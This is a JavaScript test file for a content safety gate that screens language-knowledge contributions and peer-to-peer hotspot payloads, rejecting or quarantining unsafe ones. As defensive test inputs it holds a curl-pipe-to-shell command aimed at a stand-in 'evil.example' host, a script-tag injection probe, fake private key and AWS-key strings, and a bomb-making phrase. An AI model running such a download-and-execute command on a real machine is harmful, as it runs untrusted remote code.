/**
 * core/modules/intelligence/knowledge/ui/tests/cozy-knowledge-safety-gate.test.js
 * RP-029-C Phase 4 — real, executed tests for the mandatory content
 * safety gate, and its wiring into contribution submission and
 * offline-hotspot receipt.
 * Run with: node core/modules/intelligence/knowledge/ui/tests/cozy-knowledge-safety-gate.test.js
 */

'use strict';

const assert = require('assert');
const path = require('path');

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); console.log(`  \u2713 ${name}`); passed++; }
  catch (err) { console.log(`  \u2717 ${name}`); console.log(`      ${err.message}`); failed++; }
}

const roots = {
  ingestion: path.join(__dirname, '..', '..', 'cozy-knowledge-ingestion.js'),
  community: path.join(__dirname, '..', '..', 'cozy-knowledge-community.js'),
  review: path.join(__dirname, '..', '..', 'cozy-knowledge-review.js'),
  templates: path.join(__dirname, '..', '..', '..', 'language', 'cozy-language-templates.js'),
  registry: path.join(__dirname, '..', '..', '..', 'language', 'cozy-language-registry.js'),
  hotspot: path.join(__dirname, '..', '..', '..', '..', '..', 'engines', 'collaboration', 'live-hotspot-engine.js'),
  gate: path.join(__dirname, '..', 'cozy-knowledge-safety-gate.js'),
  bridge: path.join(__dirname, '..', 'cozy-knowledge-review-hotspot-bridge.js'),
  contribCore: path.join(__dirname, '..', 'cozy-knowledge-contribution-core.js')
};

function loadModules() {
  Object.values(roots).forEach((p) => { delete require.cache[require.resolve(p)]; });
  global.window = { CozyOS: {} };
  require(roots.ingestion);
  require(roots.community);
  require(roots.review);
  require(roots.templates);
  require(roots.registry);
  require(roots.hotspot);
  require(roots.gate);
  require(roots.bridge);
  require(roots.contribCore);
  return {
    Community: global.window.CozyOS.CozyKnowledgeCommunity,
    Gate: global.window.CozyOS.CozyKnowledgeSafetyGate,
    Bridge: global.window.CozyOS.CozyKnowledgeReviewHotspotBridge,
    ContribCore: global.window.CozyOS.CozyKnowledgeContributionCore
  };
}

let mods = loadModules();
let Community = mods.Community, Gate = mods.Gate, Bridge = mods.Bridge, ContribCore = mods.ContribCore;
function reset() { mods = loadModules(); Community = mods.Community; Gate = mods.Gate; Bridge = mods.Bridge; ContribCore = mods.ContribCore; }

function readyDraft(overrides) {
  return ContribCore.createDraft(Object.assign({
    contributionType: 'TEXT', language: 'sw', expression: 'Sasa', meaning: 'informal greeting',
    context: 'youth slang', consent: { acknowledged: true }
  }, overrides || {}));
}

// ---------------------------------------------------------------------
test('module loads and exposes classify/quarantine API', () => {
  assert.strictEqual(typeof Gate.classify, 'function');
  assert.strictEqual(typeof Gate.quarantine, 'function');
  assert.strictEqual(typeof Gate.releaseFromQuarantine, 'function');
});

// ---------------------------------------------------------------------
// Structural UNSAFE categories
// ---------------------------------------------------------------------
test('classify(): UNSAFE for a private key header', () => {
  const r = Gate.classify({ expression: '-----BEGIN RSA PRIVATE KEY-----\nMIIB...', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'CREDENTIAL_LEAK');
});

test('classify(): UNSAFE for an AWS-shaped access key', () => {
  const r = Gate.classify({ notes: 'key AKIAABCDEFGHIJKLMNOP here', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'CREDENTIAL_LEAK');
});

test('classify(): UNSAFE for an embedded <script> tag', () => {
  const r = Gate.classify({ context: 'see <script>alert(1)</script>', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'MALWARE_PATTERN');
});

test('classify(): UNSAFE for a curl-pipe-to-shell pattern', () => {
  const r = Gate.classify({ notes: 'run curl http://evil.example/x.sh | sh', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'MALWARE_PATTERN');
});

test('classify(): UNSAFE for an SSN-shaped number', () => {
  const r = Gate.classify({ notes: 'my number is 123-45-6789', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'STOLEN_PII_PATTERN');
});

test('classify(): UNSAFE for an explicit multi-token adult-content phrase', () => {
  const r = Gate.classify({ context: 'a link to explicit sexual video content', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'EXPLICIT_ADULT_CONTENT');
});

test('classify(): UNSAFE for an instructional-harm phrase', () => {
  const r = Gate.classify({ context: 'how to make a bomb at home', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNSAFE');
  assert.strictEqual(r.category, 'INSTRUCTIONAL_HARM');
});

// ---------------------------------------------------------------------
// Meaning-before-judgment: never auto-reject a bare ambiguous word
// ---------------------------------------------------------------------
test('classify(): a bare, ambiguous single term is UNCERTAIN, never UNSAFE (meaning-before-judgment)', () => {
  const r = Gate.classify({ expression: 'porn', meaning: 'unrelated', context: 'short', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'UNCERTAIN');
  assert.strictEqual(r.category, 'AMBIGUOUS_SINGLE_TERM');
});

test('classify(): ordinary legitimate vocabulary with rich context is SAFE, not flagged by cross-language homonymy', () => {
  const r = Gate.classify({ expression: 'nyasaye', meaning: 'God', context: 'used in religious and everyday speech across Luo communities', contributionType: 'TEXT' });
  assert.strictEqual(r.classification, 'SAFE');
});

test('classify(): identical ambiguous term with a lot of surrounding real context is not forced to UNSAFE', () => {
  const r = Gate.classify({ expression: 'porn', meaning: 'a hypothetical unrelated meaning in some language', context: 'used commonly in daily greetings among elders in this specific region during morning markets', contributionType: 'TEXT' });
  assert.notStrictEqual(r.classification, 'UNSAFE');
});

// ---------------------------------------------------------------------
// Media-referencing contributions this repo cannot actually analyze
// ---------------------------------------------------------------------
test('classify(): AUDIO_REFERENCE with a reference string is UNCERTAIN (honest — media not analyzed), never SAFE by default', () => {
  const r = Gate.classify({ contributionType: 'AUDIO_REFERENCE', audioReference: 'ref://some-clip', meaning: 'x', context: 'y' });
  assert.strictEqual(r.classification, 'UNCERTAIN');
  assert.strictEqual(r.category, 'MEDIA_NOT_ANALYZED');
  assert.strictEqual(r.mediaNotAnalyzed, true);
});

// ---------------------------------------------------------------------
// Quarantine store
// ---------------------------------------------------------------------
test('quarantine(): stores an UNCERTAIN item, listQuarantined() surfaces it', () => {
  reset();
  const classification = Gate.classify({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' });
  const entry = Gate.quarantine({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' }, classification, 'contributorX');
  const list = Gate.listQuarantined();
  assert.ok(list.some((e) => e.id === entry.id));
});

test('releaseFromQuarantine(): APPROVE returns the original fields for real ingestion; REJECT removes it', () => {
  reset();
  const c1 = Gate.classify({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' });
  const e1 = Gate.quarantine({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' }, c1, 'c1');
  const approved = Gate.releaseFromQuarantine(e1.id, 'APPROVE', 'reviewer1');
  assert.strictEqual(approved.status, 'APPROVED');
  assert.strictEqual(approved.fields.expression, 'porn');

  const c2 = Gate.classify({ expression: 'nude', meaning: 'm', contributionType: 'TEXT' });
  const e2 = Gate.quarantine({ expression: 'nude', meaning: 'm', contributionType: 'TEXT' }, c2, 'c2');
  const rejected = Gate.releaseFromQuarantine(e2.id, 'REJECT', 'reviewer1');
  assert.strictEqual(rejected.status, 'REJECTED');
  assert.ok(!Gate.listQuarantined().some((e) => e.id === e2.id));
});

test('releaseFromQuarantine(): ALREADY_REVIEWED on a second attempt', () => {
  reset();
  const c1 = Gate.classify({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' });
  const e1 = Gate.quarantine({ expression: 'porn', meaning: 'm', contributionType: 'TEXT' }, c1, 'c1');
  Gate.releaseFromQuarantine(e1.id, 'APPROVE', 'r1');
  const second = Gate.releaseFromQuarantine(e1.id, 'APPROVE', 'r1');
  assert.strictEqual(second.status, 'ALREADY_REVIEWED');
});

// ---------------------------------------------------------------------
// Wiring: contribution submission is gated
// ---------------------------------------------------------------------
test('submitDraft(): UNSAFE content is hard-rejected, no real candidate created, generic user message only', () => {
  reset();
  const before = Community.listCommunityRecords({}).length;
  const d = readyDraft({ notes: '-----BEGIN RSA PRIVATE KEY-----\nfoo' });
  const result = ContribCore.submitDraft(d.id);
  assert.strictEqual(result.status, 'REJECTED_UNSAFE');
  assert.strictEqual(result.userMessage, Gate.USER_FACING_REJECTION_MESSAGE);
  assert.strictEqual(Community.listCommunityRecords({}).length, before, 'no candidate should have been created');
});

test('submitDraft(): UNCERTAIN content is quarantined, not created as a candidate, and appears in listQuarantined()', () => {
  reset();
  const before = Community.listCommunityRecords({}).length;
  const d = readyDraft({ expression: 'porn', meaning: 'm', context: 'c' });
  const result = ContribCore.submitDraft(d.id);
  assert.strictEqual(result.status, 'QUARANTINED');
  assert.strictEqual(Community.listCommunityRecords({}).length, before);
  assert.ok(Gate.listQuarantined().some((e) => e.id === result.quarantineId));
});

test('submitDraft(): SAFE content proceeds to real submission exactly as before this pass', () => {
  reset();
  const d = readyDraft();
  const result = ContribCore.submitDraft(d.id);
  assert.strictEqual(result.status, 'SUBMITTED');
  assert.ok(result.record.id);
});

// ---------------------------------------------------------------------
// Wiring: offline hotspot receipt is gated the same way (no bypass)
// ---------------------------------------------------------------------
test('hotspot bridge: UNSAFE received payload is rejected, never imported into local knowledge', () => {
  reset();
  const before = Community.listCommunityRecords({}).length;
  const payload = JSON.stringify({ type: 'cozy-knowledge-share-v1', contributionType: 'PHRASE', statement: 'x', language: 'sw', meaning: '-----BEGIN OPENSSH PRIVATE KEY-----', context: 'c' });
  const result = Bridge._handleIncomingPayloadForTests(payload, 'conn-1');
  assert.strictEqual(result.status, 'REJECTED_UNSAFE');
  assert.strictEqual(Community.listCommunityRecords({}).length, before);
});

test('hotspot bridge: UNCERTAIN received payload is quarantined, never imported', () => {
  reset();
  const before = Community.listCommunityRecords({}).length;
  const payload = JSON.stringify({ type: 'cozy-knowledge-share-v1', contributionType: 'PHRASE', statement: 'porn', language: 'sw', meaning: 'm', context: 'c' });
  const result = Bridge._handleIncomingPayloadForTests(payload, 'conn-1');
  assert.strictEqual(result.status, 'QUARANTINED');
  assert.strictEqual(Community.listCommunityRecords({}).length, before);
});

test('hotspot bridge: SAFE received payload still lands as an ordinary PRIVATE/CANDIDATE (unchanged from Phase 2/3 behavior)', () => {
  reset();
  const payload = JSON.stringify({ type: 'cozy-knowledge-share-v1', contributionType: 'PHRASE', statement: 'peer-shared expression', language: 'luo', meaning: 'shared meaning', context: 'shared context' });
  const result = Bridge._handleIncomingPayloadForTests(payload, 'conn-1');
  assert.strictEqual(result.status, 'SUBMITTED');
  assert.strictEqual(result.record.visibility, 'PRIVATE');
});

test('classify(): "statement" field (the hotspot payload\'s word-content key) is scanned, not only "expression"', () => {
  const r = Gate.classify({ statement: '-----BEGIN RSA PRIVATE KEY-----', contributionType: 'PHRASE' });
  assert.strictEqual(r.classification, 'UNSAFE');
});

console.log(`\n${passed} passed, ${failed} failed`);
process.exitCode = failed > 0 ? 1 : 0;
